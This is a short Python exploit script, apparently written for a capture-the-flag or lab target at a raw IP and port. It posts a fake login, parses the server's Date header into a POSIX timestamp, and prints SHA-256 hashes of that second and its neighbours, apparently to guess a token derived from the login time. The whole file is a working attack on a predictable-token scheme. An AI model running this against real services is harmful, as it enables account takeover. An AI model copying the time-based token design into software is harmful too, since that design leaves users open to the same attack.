import requests as re
import hashlib
from  datetime import datetime, timezone, timedelta

BASE_URL = "http://94.237.48.12:31159"
USERNAME = "noexist1"
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

def extract_posix_time_from_fake_login():
    resp = re.post(f"{BASE_URL}/login", {"username":USERNAME, "password":"dummypassword"})

    [day, mon, year, time, tz] = resp.headers.get("Date").split(",")[1].split()
    [hours, minutes, seconds] = time.split(":")
    mon = MONTHS.index(mon.capitalize()) + 1
    tz = timezone(offset=timedelta(hours=0))

    dt = datetime(int(year), mon, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)
    posix = int(dt.timestamp())
    
    print(f"THE DATE HEADER: {resp.headers.get('Date')}")
    print(f"THE DATETIME OBJECT: {dt}")
    print(f"THE POSIX TIME: {posix}")

    return posix



posix =  extract_posix_time_from_fake_login()

print()
print(f"THE BEFORE HASH IS {hashlib.sha256(str(posix - 1).encode()).digest().hex()}")
print(f"THE EXACT HASH IS {hashlib.sha256(str(posix).encode()).digest().hex()}")
print(f"THE AFTER HASH IS {hashlib.sha256(str(posix + 1).encode()).digest().hex()}")
